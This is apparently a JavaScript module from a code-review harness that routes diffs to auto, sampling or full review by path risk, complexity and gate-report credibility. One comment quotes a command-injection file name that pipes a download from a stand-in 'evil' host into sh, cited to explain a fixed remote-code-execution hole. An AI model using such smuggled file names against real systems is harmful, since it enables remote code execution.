// harness-risk-router — risk x complexity -> review depth.
//
// The operator's framework (Risco / Dificuldade -> merge automatico · sampling · testes e doc)
// as a DETERMINISTIC function of the diff. No model judgement in the scoring: the model
// consumes the tier, it does not vote on it. That is what makes "start with low-risk features"
// enforceable rather than aspirational.
//
// FAIL CLOSED for configured gates, and the bar for "credible" is high on purpose: a report is
// only credible if it carries a source hash that still matches, measures every configured metric,
// and passed. A forged five-field JSON, a report from a non-git checkout, and a report written
// before the config changed are all NOT credible. An unconfigured gate is different: nothing was
// ever measured, so there is no regression signal to respect and it routes to sampling to start
// calibration.
//
// See docs/harness/measured-gates.md.

import fs from "node:fs"
import path from "node:path"
import { pathToFileURL } from "node:url"
import {
  checkReportShape,
  isValidRef,
  makeGit,
  readJsonIfExists,
  REPORT_DIR,
  SOURCE_FILE_PATTERN,
  sourceHash,
  THRESHOLDS_PATH,
} from "./harness-quality-core.mjs"
import { pathExists } from "./harness-common.mjs"

const SAMPLING_CAP = 5

export const TIER = { AUTO: "auto", SAMPLING: "sampling", FULL: "full" }
export const RISK = { LOW: "low", MEDIUM: "medium", HIGH: "high", UNTRUSTED: "untrusted" }
// Keep safety-sensitive paths reviewable before calibration: unconfigured projects route to
// sampling, so this fallback preserves full review for changes matching the shipped defaults.
export const DEFAULT_HIGH_RISK_PATHS = Object.freeze([
  "**/auth/**",
  "**/session*",
  "**/*password*",
  "**/*credential*",
  "**/*secret*",
  "**/payment*/**",
  "**/billing/**",
  "**/*checkout*",
  "**/migrations/**",
  "**/migrate/**",
  "**/*.sql",
  "**/*.tf",
  "**/k8s/**",
  "**/helm/**",
  "**/docker-compose*.yml",
  "**/docker-compose*.yaml",
  "**/.github/workflows/**",
  "**/permission*/**",
  "**/*role*",
  "**/*rbac*",
  "**/*crypto*",
  "**/*jwt*",
  "**/quality-thresholds.json",
  "**/quality-decisions.md",
  "**/learned-rules.json",
  "**/standards/**",
  "**/security-contract.json",
  "**/dependency-ledger.json",
  "**/harness-quality-*.mjs",
  "**/evals/**",
])

export const SEMANTIC_HIGH_RISK_GLOBS = Object.freeze([
  "**/auth/**",
  "**/session*",
  "**/*session*",
  "**/*jwt*",
  "**/jwt/**",
  "**/*password*",
  "**/password/**",
  "**/*credential*",
  "**/credential*/**",
  "**/*rbac*",
  "**/rbac/**",
  "**/migrations/**",
  "**/migrate/**",
  "**/*.sql",
  "**/quality-thresholds.json",
  "**/learned-rules.json",
  "**/standards/**",
  "**/harness-quality-*.mjs",
  "**/evals/**",
])


// ---------------------------------------------------------------------------
// glob matching — small on purpose; these are path globs, not a shell

// No regex. A glob compiled to an anchored pattern with many `.*` groups separated by literals
// backtracks catastrophically: a measured adversarial glob took 104 SECONDS on one `test()`, and
// collapsing adjacent wildcards does not help because the literals sit between them. This is a
// segment-wise matcher — greedy two-pointer inside a segment, memoised DP across `**` — so the
// work is bounded by (glob segments x path segments) with no backtracking blowup.

const globCache = new Map()

// `*` and `?` within one path segment. Linear-ish greedy scan with a single star rewind point.
function matchSegment(pattern, text) {
  let patternIndex = 0
  let textIndex = 0
  let starIndex = -1
  let rewind = 0

  while (textIndex < text.length) {
    const current = pattern[patternIndex]
    if (patternIndex < pattern.length && (current === "?" || current === text[textIndex])) {
      patternIndex += 1
      textIndex += 1
      continue
    }
    if (patternIndex < pattern.length && current === "*") {
      starIndex = patternIndex
      patternIndex += 1
      rewind = textIndex
      continue
    }
    if (starIndex !== -1) {
      patternIndex = starIndex + 1
      rewind += 1
      textIndex = rewind
      continue
    }
    return false
  }
  while (patternIndex < pattern.length && pattern[patternIndex] === "*") patternIndex += 1
  return patternIndex === pattern.length
}

export function globToMatcher(glob) {
  if (globCache.has(glob)) return globCache.get(glob)
  if (glob.length > 300) throw new Error(`glob too long (${glob.length}) — refusing to compile`)

  const globSegments = glob.toLowerCase().split("/")
  const matcher = {
    test(file) {
      const pathSegments = file.toLowerCase().split("/")
      const memo = new Set()
      const failed = new Set()
      const key = (globIndex, pathIndex) => globIndex * (pathSegments.length + 1) + pathIndex

      const go = (globIndex, pathIndex) => {
        if (globIndex === globSegments.length) return pathIndex === pathSegments.length
        const cacheKey = key(globIndex, pathIndex)
        if (failed.has(cacheKey)) return false
        if (memo.has(cacheKey)) return true

        let result = false
        if (globSegments[globIndex] === "**") {
          // `**` consumes zero or more path segments.
          for (let consumed = pathIndex; consumed <= pathSegments.length; consumed += 1) {
            if (go(globIndex + 1, consumed)) {
              result = true
              break
            }
          }
        } else if (pathIndex < pathSegments.length && matchSegment(globSegments[globIndex], pathSegments[pathIndex])) {
          result = go(globIndex + 1, pathIndex + 1)
        }

        if (result) memo.add(cacheKey)
        else failed.add(cacheKey)
        return result
      }

      return go(0, 0)
    },
  }

  globCache.set(glob, matcher)
  return matcher
}

export function matchGlobs(file, globs) {
  const normalised = file.replace(/\\/g, "/")
  for (const glob of globs ?? []) {
    try {
      if (globToMatcher(glob).test(normalised)) return glob
    } catch {
      // A glob we refuse to compile must not silently stop matching the rest.
      continue
    }
  }
  return null
}

// ---------------------------------------------------------------------------
// diff facts

function resolveBase(git, requested) {
  if (requested) return requested
  for (const candidate of ["origin/main", "origin/master", "main", "master"]) {
    const mergeBase = git.mergeBase(candidate)
    if (mergeBase) return mergeBase
  }
  const head = git.head()
  return head || "HEAD"
}

const MANIFEST_PATTERN = /(package\.json|pyproject\.toml|requirements.*\.txt|Gemfile|go\.mod|Cargo\.toml)$/i

export function collectDiffFacts(git, base) {
  const files = [...new Set([...git.changedSince(base), ...git.changedInWorktree(), ...git.untracked()])]

  let added = 0
  let removed = 0
  for (const line of git.numstat(base).split("\n")) {
    const parts = line.trim().split(/\s+/)
    if (parts.length < 3) continue
    added += Number(parts[0]) || 0
    removed += Number(parts[1]) || 0
  }

  // Manifest paths are passed as git ARGUMENTS, never interpolated into a shell string. A file
  // named `foo;curl evil|sh;package.json` matched this end-anchored pattern and became RCE.
  const manifestPaths = files.filter((file) => MANIFEST_PATTERN.test(file))
  const trackedManifests = manifestPaths.filter((file) => git.isTracked(file))
  const untrackedManifests = manifestPaths.filter((file) => !git.isTracked(file))

  let newDependencies = (git.diffPaths(base, trackedManifests).match(/^\+\s*"?[\w@/.-]+"?\s*[:=]/gm) ?? []).length
  // A brand-new untracked manifest has no diff at all, so its dependencies were invisible.
  for (const manifest of untrackedManifests) {
    newDependencies += countDependencyEntries(path.join(git.root ?? ".", manifest))
  }

  const schemaChange = files.some(
    (file) => /(migrations?|migrate)\//i.test(file) || /\.(sql|prisma)$/i.test(file) || /schema\.(rb|py|ts|graphql)$/i.test(file),
  )

  return {
    files,
    filesTouched: files.length,
    netLines: added - removed,
    addedLines: added,
    newDependencies,
    manifestTouched: manifestPaths.length > 0,
    schemaChange,
  }
}

function countDependencyEntries(manifestPath) {
  const data = readJsonIfExists(manifestPath)
  if (data) return Object.keys(data.dependencies ?? {}).length + Object.keys(data.devDependencies ?? {}).length
  return 0
}
/**
 * Computes the true net union of changed files and net changed lines across
 * multiple dependent PRs/commits from the initiative base commit (AC-PRCI-04).
 * Eliminates duplicate counting when lines are added in one commit and reverted
 * or modified in a subsequent commit.
 */
export function computeInitiativeCumulativeDiff(commitsOrDiffs = [], { baseSha = null, git = null, root = null } = {}) {
  if (git && baseSha) {
    const tipSha = (Array.isArray(commitsOrDiffs) && commitsOrDiffs.length > 0 && typeof commitsOrDiffs[commitsOrDiffs.length - 1] === "string" && !commitsOrDiffs[commitsOrDiffs.length - 1].includes("\n"))
      ? commitsOrDiffs[commitsOrDiffs.length - 1]
      : "HEAD"

    try {
      let numstatOutput = ""
      if (typeof git.exec === "function") {
        const res = git.exec(["diff", "--numstat", baseSha, tipSha])
        if (res?.ok) numstatOutput = res.stdout
        else {
          const res2 = git.exec(["diff", "--numstat", `${baseSha}..${tipSha}`])
          if (res2?.ok) numstatOutput = res2.stdout
        }
      } else if (typeof git.numstat === "function") {
        numstatOutput = git.numstat(baseSha)
      }

      if (numstatOutput !== undefined && numstatOutput !== null && typeof numstatOutput === "string") {
        return parseNumstatOutput(numstatOutput)
      }
    } catch {
      // Fall through to in-memory reducer
    }
  }

  const rawByFile = new Map()
  const filesOrder = []
  const items = Array.isArray(commitsOrDiffs) ? commitsOrDiffs : [commitsOrDiffs]

  for (const item of items) {
    if (!item) continue

    if (typeof item === "string") {
      for (const line of item.split(/\r?\n/)) {
        const parts = line.trim().split(/\s+/)
        if (parts.length >= 3 && (/^\d+$/.test(parts[0]) || parts[0] === "-")) {
          const a = parts[0] === "-" ? 0 : Number(parts[0]) || 0
          const r = parts[1] === "-" ? 0 : Number(parts[1]) || 0
          const file = parts.slice(2).join(" ")
          if (!rawByFile.has(file)) filesOrder.push(file)
          const cur = rawByFile.get(file) || { added: 0, removed: 0 }
          cur.added += a
          cur.removed += r
          rawByFile.set(file, cur)
        }
      }
      continue
    }

    if (typeof item.numstat === "string") {
      for (const line of item.numstat.split(/\r?\n/)) {
        const parts = line.trim().split(/\s+/)
        if (parts.length >= 3) {
          const a = parts[0] === "-" ? 0 : Number(parts[0]) || 0
          const r = parts[1] === "-" ? 0 : Number(parts[1]) || 0
          const file = parts.slice(2).join(" ")
          if (!rawByFile.has(file)) filesOrder.push(file)
          const cur = rawByFile.get(file) || { added: 0, removed: 0 }
          cur.added += a
          cur.removed += r
          rawByFile.set(file, cur)
        }
      }
      continue
    }

    if (Array.isArray(item.changes)) {
      for (const ch of item.changes) {
        const file = ch.file || ch.path
        if (!file) continue
        const a = Number(ch.added ?? ch.additions ?? ch.linesAdded ?? 0) || 0
        const r = Number(ch.removed ?? ch.deletions ?? ch.linesRemoved ?? 0) || 0
        if (!rawByFile.has(file)) filesOrder.push(file)
        const cur = rawByFile.get(file) || { added: 0, removed: 0 }
        cur.added += a
        cur.removed += r
        rawByFile.set(file, cur)
      }
      continue
    }

    const file = item.file || item.path
    if (file && typeof file === "string") {
      const a = Number(item.added ?? item.additions ?? item.linesAdded ?? 0) || 0
      const r = Number(item.removed ?? item.deletions ?? item.linesRemoved ?? 0) || 0
      if (!rawByFile.has(file)) filesOrder.push(file)
      const cur = rawByFile.get(file) || { added: 0, removed: 0 }
      cur.added += a
      cur.removed += r
      rawByFile.set(file, cur)
      continue
    }

    if (Array.isArray(item.files)) {
      const a = Number(item.added ?? item.additions ?? 0) || 0
      const r = Number(item.removed ?? item.deletions ?? 0) || 0
      const count = item.files.length || 1
      for (const f of item.files) {
        if (!rawByFile.has(f)) filesOrder.push(f)
        const cur = rawByFile.get(f) || { added: 0, removed: 0 }
        cur.added += Math.round(a / count)
        cur.removed += Math.round(r / count)
        rawByFile.set(f, cur)
      }
    }
  }

  const byFile = {}
  let totalNetAdded = 0
  let totalNetRemoved = 0

  for (const file of filesOrder) {
    const raw = rawByFile.get(file) || { added: 0, removed: 0 }
    let netAdded = 0
    let netRemoved = 0
    if (raw.added >= raw.removed) {
      netAdded = raw.added - raw.removed
      netRemoved = 0
    } else {
      netAdded = 0
      netRemoved = raw.removed - raw.added
    }

    byFile[file] = {
      added: netAdded,
      removed: netRemoved,
      netLines: raw.added - raw.removed,
      rawAdded: raw.added,
      rawRemoved: raw.removed,
    }

    totalNetAdded += netAdded
    totalNetRemoved += netRemoved
  }

  const files = [...filesOrder]
  const filesWithNetChanges = files.filter((f) => byFile[f].added > 0 || byFile[f].removed > 0)

  return {
    files,
    filesTouched: files.length,
    filesWithNetChanges,
    addedLines: totalNetAdded,
    removedLines: totalNetRemoved,
    netLines: totalNetAdded - totalNetRemoved,
    totalLinesChanged: totalNetAdded + totalNetRemoved,
    byFile,
  }
}

function parseNumstatOutput(text) {
  const byFile = {}
  const files = []
  let addedLines = 0
  let removedLines = 0

  for (const line of String(text).split(/\r?\n/)) {
    const parts = line.trim().split(/\s+/)
    if (parts.length < 3) continue
    const added = parts[0] === "-" ? 0 : Number(parts[0]) || 0
    const removed = parts[1] === "-" ? 0 : Number(parts[1]) || 0
    const file = parts.slice(2).join(" ")
    files.push(file)
    addedLines += added
    removedLines += removed
    byFile[file] = { added, removed, netLines: added - removed }
  }

  return {
    files,
    filesTouched: files.length,
    filesWithNetChanges: files.filter((f) => byFile[f].added > 0 || byFile[f].removed > 0),
    addedLines,
    removedLines,
    netLines: addedLines - removedLines,
    totalLinesChanged: addedLines + removedLines,
    byFile,
  }
}

// ---------------------------------------------------------------------------
// gate posture — the fail-closed input

// A report is credible only if all of these hold. Each condition closes a real fail-open:
//  - verdict pass          (obvious)
//  - not unconfigured      (it measured nothing)
//  - sourceHash PRESENT    (a missing hash skipped the staleness check entirely, so a forged
//                           or non-git report stayed fresh forever)
//  - sourceHash matches    (staleness by content)
//  - rows non-empty and covering every configured metric (a truncated or forged report with
//                           `rows: []` has zero red rows, so everything downstream read green)
export function assessReport(report, { currentHash, configuredMetrics }) {
  // Shape checks live in core so the gate's `previousReportFor` cannot drift from this one.
  const shape = checkReportShape(report)
  if (!shape.credible) return shape

  if (currentHash && report.sourceHash !== currentHash) {
    return { credible: false, reason: "report is stale (source or gate config changed since it was written)" }
  }
  const rows = report.rows
  const measured = new Set(rows.map((row) => row.metric))
  const missing = (configuredMetrics ?? []).filter((metric) => !measured.has(metric))
  // A `full`-only metric legitimately absent from a local report is fine; anything else missing
  // means the report does not describe the configured gate.
  if (missing.length && report.mode === "full") {
    return { credible: false, reason: `report is missing configured metric(s): ${missing.join(", ")}` }
  }
  return { credible: true }
}

export function latestGateReport(root, { git, thresholds } = {}) {
  const dir = path.join(root, REPORT_DIR)
  if (!pathExists(dir)) return { credible: false, reason: "no gate report directory" }

  const names = fs
    .readdirSync(dir)
    .filter((name) => name.endsWith(".json"))
    .sort()
    .reverse()
  if (names.length === 0) return { credible: false, reason: "no gate report found" }

  const currentHash = sourceHash(root, { git, thresholds, fresh: true })
  const configuredMetrics = Object.entries(thresholds?.metrics ?? {}).map(([name]) => name)

  // Parse every candidate and prefer a credible FULL report, then a credible local one.
  // Selecting by filename let a local run labelled `full-lane` outrank a real full report.
  const parsed = names
    .map((name) => ({ name, report: readJsonIfExists(path.join(dir, name)) }))
    .filter((entry) => entry.report && Object.hasOwn(entry.report, "verdict") && Object.hasOwn(entry.report, "mode"))
  if (parsed.length === 0) return { credible: false, reason: "no gate report found" }
  const assessed = parsed.map((entry) => ({ ...entry, assessment: assessReport(entry.report, { currentHash, configuredMetrics }) }))

  const credibleFull = assessed.find((entry) => entry.assessment.credible && entry.report.mode === "full")
  const credibleAny = assessed.find((entry) => entry.assessment.credible)
  const chosen = credibleFull ?? credibleAny ?? assessed[0]

  if (!chosen.assessment.credible) {
    return {
      credible: false,
      unconfigured: false,
      reason: chosen.assessment.reason,
      report: chosen.report,
      path: path.join(REPORT_DIR, chosen.name),
    }
  }
  return { credible: true, unconfigured: false, report: chosen.report, path: path.join(REPORT_DIR, chosen.name) }
}

// ---------------------------------------------------------------------------
// scoring

export function scoreComplexity(facts, signals, gateReport) {
  const reasons = []
  let score = 0

  const compare = (name, actual) => {
    const rule = signals?.[name]
    if (!rule) return
    if (rule.op === "gt" && actual > rule.value) {
      score += 1
      reasons.push(`${name}=${actual} > ${rule.value}`)
    } else if (rule.op === "gte" && actual >= rule.value) {
      score += 1
      reasons.push(`${name}=${actual} >= ${rule.value}`)
    } else if (rule.op === "present" && actual) {
      score += 1
      reasons.push(`${name} present`)
    }
  }

  compare("files_touched", facts.filesTouched)
  compare("net_lines", facts.netLines)
  compare("new_dependencies", facts.newDependencies)
  compare("schema_change", facts.schemaChange)

  const complexityRow = gateReport?.rows?.find((row) => row.metric === "cyclomatic_max")
  const breached = complexityRow && complexityRow.status !== "pass" && complexityRow.status !== "unavailable"
  compare("complexity_breach", Boolean(breached))

  const level = score >= 4 ? "high" : score >= 2 ? "medium" : "low"
  return { score, level, reasons }
}

// The router produces low/medium/high. `untrusted` is NEVER computed — it describes provenance
// (untrusted input, third-party or generated code, an external contributor) and only the
// operator or PREVC's Prepare declares it. The router may RAISE a declared class, never lower it.
function isSemanticHighRiskPath(file) {
  const norm = file.replace(/\\/g, "/")
  if (/(^|\/)auth\//i.test(norm) || /(^|\/)session[^/]*(\/|$)/i.test(norm) || /jwt/i.test(norm) || /password/i.test(norm) || /credential/i.test(norm) || /rbac/i.test(norm)) {
    return { isMatch: true, pattern: "auth/session/jwt/password/credential/rbac", category: "authentication" }
  }
  if (/(^|\/)(migrations?|migrate)\//i.test(norm) || /\.sql$/i.test(norm)) {
    return { isMatch: true, pattern: "migrations/migrate/*.sql", category: "database_migrations" }
  }
  if (/(^|\/)(quality-thresholds\.json|learned-rules\.json)$/i.test(norm) || /(^|\/)standards\//i.test(norm) || /(^|\/)harness-quality-[^/]+\.mjs$/i.test(norm) || /(^|\/)evals\//i.test(norm)) {
    return { isMatch: true, pattern: "quality-thresholds/learned-rules/standards/harness-quality/evals", category: "core_harness_policy" }
  }
  return { isMatch: false, pattern: null, category: null }
}

/**
 * Classifies topological semantic risk of changed files (AC-PRCI-05).
 * Identifies whether any file touches authentication, database migrations, or
 * core harness/quality policies, forcing TIER.FULL and risk HIGH regardless of line count.
 */
export function classifySemanticRisk(changedFiles = [], { highRiskGlobs = null } = {}) {
  const globs = highRiskGlobs ?? SEMANTIC_HIGH_RISK_GLOBS
  const matches = []
  const categories = new Set()

  for (const file of changedFiles ?? []) {
    const normalised = String(file).replace(/\\/g, "/")
    let matched = matchGlobs(normalised, globs)
    let category = null

    if (matched) {
      if (/(auth|session|jwt|password|credential|rbac)/i.test(matched) || /(auth|session|jwt|password|credential|rbac)/i.test(normalised)) {
        category = "authentication"
      } else if (/(migration|migrate|\.sql)/i.test(matched) || /(migration|migrate|\.sql)/i.test(normalised)) {
        category = "database_migrations"
      } else if (/(quality-thresholds|learned-rules|standards|harness-quality|evals)/i.test(matched) || /(quality-thresholds|learned-rules|standards|harness-quality|evals)/i.test(normalised)) {
        category = "core_harness_policy"
      } else {
        category = "high_risk_policy"
      }
    } else if (!highRiskGlobs) {
      const semanticCheck = isSemanticHighRiskPath(normalised)
      if (semanticCheck.isMatch) {
        matched = semanticCheck.pattern
        category = semanticCheck.category
      }
    }

    if (matched) {
      categories.add(category)
      matches.push({ file, matched, category })
    }
  }

  const isHighRisk = matches.length > 0
  return {
    isHighRisk,
    risk: isHighRisk ? RISK.HIGH : RISK.LOW,
    tier: isHighRisk ? TIER.FULL : null,
    matches,
    categories: [...categories],
    reasons: matches.map((m) => `topological semantic risk: ${m.file} matched ${m.matched} (${m.category})`),
  }
}

export function resolveRisk(facts, thresholds, complexity, declared) {
  const reasons = []
  let risk = RISK.LOW

  const highRiskGlobs = thresholds?.high_risk_paths ?? DEFAULT_HIGH_RISK_PATHS
  const semantic = classifySemanticRisk(facts.files, { highRiskGlobs })
  if (semantic.isHighRisk) {
    reasons.push(...semantic.reasons)
    risk = RISK.HIGH
  }

  if (risk === RISK.LOW) {
    for (const file of facts.files) {
      const matched = matchGlobs(file, thresholds?.sensitive_paths)
      if (matched) {
        reasons.push(`sensitive path: ${file} matched ${matched}`)
        risk = RISK.MEDIUM
        break
      }
    }
  }

  if (risk === RISK.LOW && complexity.level !== "low") {
    risk = RISK.MEDIUM
    reasons.push(`complexity ${complexity.level} raises risk to medium`)
  }

  const order = [RISK.LOW, RISK.MEDIUM, RISK.HIGH, RISK.UNTRUSTED]
  if (declared && order.indexOf(declared) > order.indexOf(risk)) {
    reasons.push(`operator declared ${declared} — the router never lowers a declared class`)
    return { risk: declared, reasons }
  }

  return { risk, reasons }
}


export function resolveTier({ risk, complexity, gate }) {
  if (risk === RISK.HIGH || risk === RISK.UNTRUSTED) return { tier: TIER.FULL, why: `risk ${risk}` }
  if (complexity.level === "high") return { tier: TIER.FULL, why: "complexity high" }
  if (!gate.credible && !gate.unconfigured) return { tier: TIER.FULL, why: `gate not credibly green — ${gate.reason} (fail closed)` }
  if (gate.unconfigured) return { tier: TIER.SAMPLING, why: "gate unconfigured — nothing measured yet; run harness-project-calibration or install the template via /harness-bootstrap" }
  // Medium risk must consume review. Without this branch a change touching a declared sensitive
  // path with low complexity fell through to `auto` — no diff read — while the output still
  // printed "Risk: medium", making PREVC's medium-risk evidence rule unreachable.
  if (risk === RISK.MEDIUM) return { tier: TIER.SAMPLING, why: "risk medium, gate green" }
  if (complexity.level === "medium") return { tier: TIER.SAMPLING, why: "complexity medium, gate green" }
  // `auto` means nobody reads the diff, so the report IS the review — a metric that
  // SHOULD have measured and did not is a gap in that evidence, and prevents `auto`.
  //
  // Only status `unavailable` counts here. `not_configured` and `not_applicable` do not:
  // they are permanent, known facts about this project, and escalating on them escalates
  // on every change forever, which is what made `auto` unreachable while 15 of 21 metrics
  // had no instrument. They are still reported — see the gate's measurementCoverage and
  // its notes — they just are not evidence of something breaking now.
  const unavailableRows = (gate.report?.rows ?? []).filter((row) => row.status === "unavailable")
  if (unavailableRows.length > 0) {
    return {
      tier: TIER.SAMPLING,
      why: `gate green but ${unavailableRows.length} instrumented metric(s) unavailable — configured and produced nothing (${unavailableRows
        .map((row) => row.metric)
        .join(", ")}) — auto requires every metric that has an instrument to actually report`,
    }
  }
  // `auto` means nobody reads the diff, so it requires the FULL gate: a local report has
  // mutation and e2e filtered out of its rows entirely.
  if (gate.report?.mode !== "full") {
    return { tier: TIER.SAMPLING, why: `gate green but only at --mode ${gate.report?.mode ?? "unknown"}; auto requires a full run` }
  }
  return { tier: TIER.AUTO, why: "low risk, low complexity, full gate green" }
}

// ---------------------------------------------------------------------------
// sampling set

export function selectSample(facts, gateReport) {
  const sourceFiles = facts.files.filter((file) => SOURCE_FILE_PATTERN.test(file))
  // A change made entirely of prose/config produced "0 of 0 source files" and nothing was read —
  // sampling degenerating into `auto` without saying so. Agent and skill policy IS the
  // highest-leverage text in this harness, so fall back to whatever changed.
  const pool = sourceFiles.length > 0 ? sourceFiles : facts.files
  const kind = sourceFiles.length > 0 ? "source" : "changed (no source files — reviewing prose/config)"

  const detailOf = (metric) => gateReport?.rows?.find((row) => row.metric === metric)?.detail ?? ""
  const worstComplexity = String(detailOf("cyclomatic_max")).split(":")[0]?.replace(/\\/g, "/")
  const worstModule = String(detailOf("module_lines_max")).replace(/\\/g, "/")

  const ranked = [...pool].sort((left, right) => {
    const weight = (file) => {
      const normalised = file.replace(/\\/g, "/")
      if (worstComplexity && normalised.endsWith(worstComplexity)) return 0
      if (worstModule && normalised.endsWith(worstModule)) return 1
      return 2
    }
    return weight(left) - weight(right)
  })

  const selected = ranked.slice(0, SAMPLING_CAP)
  return { selected, total: pool.length, kind, capped: pool.length > SAMPLING_CAP, cap: SAMPLING_CAP, empty: pool.length === 0 }
}

// ---------------------------------------------------------------------------
// main

export function route(options = {}) {
  const root = path.resolve(options.root ?? process.cwd())
  const git = options.git ?? makeGit(root)
  git.root = root
  const base = resolveBase(git, options.since)
  const thresholds = options.thresholds ?? readJsonIfExists(path.join(root, THRESHOLDS_PATH))

  // No thresholds file means the gate cannot have measured anything against a bar, so no report
  // on disk can be credible — including one written before the file was removed.
  const gate = thresholds
    ? (options.gate ?? latestGateReport(root, { git, thresholds }))
    : { credible: false, unconfigured: true, reason: `no ${THRESHOLDS_PATH} — the gate is unconfigured` }

  const facts = options.cumulativeFacts ?? options.diffFacts ?? options.facts ?? collectDiffFacts(git, base)
  const complexity = scoreComplexity(facts, thresholds?.complexity_signals, gate.report)
  const risk = resolveRisk(facts, thresholds, complexity, options.declaredRisk)
  const tier = resolveTier({ risk: risk.risk, complexity, gate })
  const sample = tier.tier === TIER.SAMPLING ? selectSample(facts, gate.report) : null

  return {
    base,
    tier: tier.tier,
    tierReason: tier.why,
    risk: risk.risk,
    riskReasons: risk.reasons,
    complexity,
    gate: {
      credible: gate.credible,
      unconfigured: Boolean(gate.unconfigured),
      reason: gate.reason ?? null,
      report: gate.path ?? null,
      mode: gate.report?.mode ?? null,
    },
    facts: {
      filesTouched: facts.filesTouched,
      netLines: facts.netLines,
      newDependencies: facts.newDependencies,
      schemaChange: facts.schemaChange,
    },
    sample,
    thresholdsPresent: Boolean(thresholds),
    requires: tier.tier === TIER.SAMPLING ? ["tests for the sampled changes", "docs for the sampled changes"] : [],
  }
}

export function renderText(result) {
  const lines = [
    `Tier: ${result.tier}   (${result.tierReason})`,
    `Risk: ${result.risk}${result.riskReasons.length ? `        ${result.riskReasons[0]}` : "        no high-risk path matched"}`,
    `Complexity: ${result.complexity.score} (${result.complexity.level})${result.complexity.reasons.length ? `   ${result.complexity.reasons.join("; ")}` : ""}`,
    `Gate: ${result.gate.credible ? `green (${result.gate.mode})   ${result.gate.report}` : `NOT CREDIBLE — ${result.gate.reason}`}`,
    `Diff: ${result.facts.filesTouched} files, net ${result.facts.netLines >= 0 ? "+" : ""}${result.facts.netLines} lines, base ${result.base}`,
  ]
  if (result.sample) {
    if (result.sample.empty) lines.push("WARNING: sampling tier with nothing to sample — treat as full and read the diff.")
    else {
      lines.push(`Review these ${result.sample.selected.length} of ${result.sample.total} ${result.sample.kind} files: ${result.sample.selected.join(", ")}`)
      if (result.sample.capped) {
        lines.push(`  (capped at ${result.sample.cap} — ${result.sample.total - result.sample.cap} files not sampled; say so in the review)`)
      }
    }
  }
  if (result.requires.length) lines.push(`Required: ${result.requires.join(" + ")}`)
  if (result.tier === TIER.FULL) lines.push("Full review: /code-review (both axes) + @security-analyst. A human reads the diff.")
  if (result.tier === TIER.AUTO) lines.push("Auto: no diff read. Gate report is the evidence. Operator still confirms.")
  return lines.join("\n")
}

function runCli() {
  const args = process.argv.slice(2)
  const valueOf = (flag, fallback) => {
    const index = args.indexOf(flag)
    return index !== -1 && args[index + 1] ? args[index + 1] : fallback
  }

  // An unknown --declared-risk was silently ignored: an operator who typed `untruted` got the
  // LEAST review instead of the most. Fail-open on operator input is worse than a crash.
  const declaredRisk = valueOf("--declared-risk", null)
  if (declaredRisk && !Object.values(RISK).includes(declaredRisk)) {
    console.error(`harness-risk-router: unknown --declared-risk "${declaredRisk}". Expected one of: ${Object.values(RISK).join(", ")}.`)
    process.exitCode = 2
    return
  }

  const since = valueOf("--since", null)
  if (since && !isValidRef(since)) {
    console.error(`harness-risk-router: unsafe --since ${JSON.stringify(since)} — expected a plain git ref.`)
    process.exitCode = 2
    return
  }

  let result
  try {
    result = route({ root: path.resolve(valueOf("--project", process.cwd())), since, declaredRisk })
  } catch (error) {
    console.error(`harness-risk-router could not run: ${error.message}`)
    process.exitCode = 2
    return
  }

  if (args.includes("--json")) console.log(JSON.stringify(result, null, 2))
  else console.log(renderText(result))
}

if (process.argv[1] && import.meta.url === pathToFileURL(process.argv[1]).href) runCli()
